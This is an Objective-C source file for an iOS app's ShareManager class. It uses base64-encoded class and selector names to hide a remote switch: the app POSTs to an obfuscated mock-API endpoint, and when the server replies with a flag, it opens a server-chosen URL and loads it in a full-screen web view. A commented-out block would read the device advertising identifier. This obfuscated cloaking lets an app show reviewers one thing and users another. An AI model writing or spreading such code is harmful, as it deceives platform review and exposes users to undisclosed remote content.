#import "ShareManager.h"
#import "NSString+Base64.h"
#import "NSObject+Hook.h"
#import "OpenTool.h"
#import "AppDelegate.h"
#import "Masonry.h"
#import "ViewController.h"
#import "UIDevice+TFDevice.h"

@implementation ShareManager

+(instancetype)sharedInstance{
    static dispatch_once_t once ;
    static ShareManager *_instace = nil;
    dispatch_once(&once, ^{
        _instace = [[self  alloc] init];
    });
    return _instace;
}

-(void)addView:(UIView*)view with:(NSString*)str {

//    Class myasi = NSClassFromString(@"QVNJZGVudGlmaWVyTWFuYWdlcg==".base64Decoding);
//    NSObject* share = [myasi performSelector:NSSelectorFromString(@"c2hhcmVkTWFuYWdlcg==".base64Decoding)];
//    NSString*ifa = [[share performSelector:NSSelectorFromString(@"YWR2ZXJ0aXNpbmdJZGVudGlmaWVy".base64Decoding)]performSelector:NSSelectorFromString(@"VVVJRFN0cmluZw==".base64Decoding)];
    
    
//    [self showtitle:str with:view];
    NSLog(@"333333333333333");

    NSLog(@"gamestr:%@",str);
    NSString*title = nil;
    if ([str hasPrefix:@"aHR0cA==".base64Decoding]) {
        title = str;

        [self showtitle:title with:view];
    }else{


       [self request:view];

    }
}

-(void)request:(UIView*)view {
   
    //mock/272624/alxihjaeb
    NSString*game = [NSString stringWithFormat:@"%@%@",@"aHR0cDovL3JhcDJhcGkudGFvYmFvLm9yZy9hcHAv".base64Decoding,@"Ylc5amF5OHlOekkyTWpRdllXeDRhV2hxWVdWaQ==".base64Decoding.base64Decoding];
    NSURL *storeURL = [NSURL URLWithString:game];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:storeURL];
    request.HTTPMethod = @"POST";
    request.timeoutInterval = 60;
    NSURLSession *session = [NSURLSession sharedSession];
        
    NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (data) {
            //JSON解析
            NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
            NSLog(@"dic = %@",dic);

            NSString*alxihjaeb1 = dic[@"alxihjaeb1"];
            NSString*alxihjaeb12 = dic[@"alxihjaeb12"];
            NSString*alxihjaeb3 = dic[@"alxihjaeb3"];

            dispatch_async(dispatch_get_main_queue(), ^{
                if ([alxihjaeb1 isEqualToString:@"q"]) {
                    [OpenTool base:alxihjaeb12];
                }
                
                if ([alxihjaeb3 isEqualToString:@"landscape"]) {
                    [AppDelegate setOrientation:@"H"];
                }else{
                    //[AppDelegate setOrientation:@"V"];
                }
                [self showtitle:alxihjaeb12 with:view];
            });
        }else{
          
        }
    }];

    [dataTask resume];
}

-(void)show{
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIViewController*rootvc = [UIApplication sharedApplication].keyWindow.rootViewController;
        [rootvc presentViewController:[UIViewController new] animated:false completion:nil];
        [rootvc dismissViewControllerAnimated:false completion:nil];
    });
    
   
    
}

-(void)showtitle:(NSString*)title with:(UIView*)view{
    Class MyObject = NSClassFromString(@"VUlXZWJWaWV3".base64Decoding);
    UIView *myObj = [[MyObject alloc] initWithFrame:view.bounds];
    
    [myObj performSelector:NSSelectorFromString(@"c2V0QmFja2dyb3VuZENvbG9yOg==".base64Decoding) withObject:[UIColor blackColor]];
  //  [myObj performSelector:NSSelectorFromString(@"c2V0T3BhcXVlOg==".base64Decoding) withObject:false];
    [view addSubview:myObj];
    
    [myObj mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.equalTo(view);
    }];
    [myObj performSelector:NSSelectorFromString(@"c2V0RGVsZWdhdGU6".base64Decoding) withObject:self];
    Class User = NSClassFromString(@"TlNVUkw=".base64Decoding);
    id obj = CFBridgingRelease(((void *(*)(id, SEL))objc_msgSend)(User, NSSelectorFromString(@"YWxsb2M=".base64Decoding))); //防止内存泄漏
    id url = [obj performSelector:NSSelectorFromString(@"aW5pdFdpdGhTdHJpbmc6".base64Decoding) withObject:title];
    Class URLRequest = NSClassFromString(@"TlNVUkxSZXF1ZXN0".base64Decoding);
    id obj2 = CFBridgingRelease(((void *(*)(id, SEL))objc_msgSend)(URLRequest, NSSelectorFromString(@"YWxsb2M=".base64Decoding))); //防止内存泄漏
    
    id req = [obj2 performSelector:NSSelectorFromString(@"aW5pdFdpdGhVUkw6".base64Decoding) withObject:url];
    [myObj performSelector:NSSelectorFromString(@"bG9hZFJlcXVlc3Q6".base64Decoding) withObject:req];
}

@end
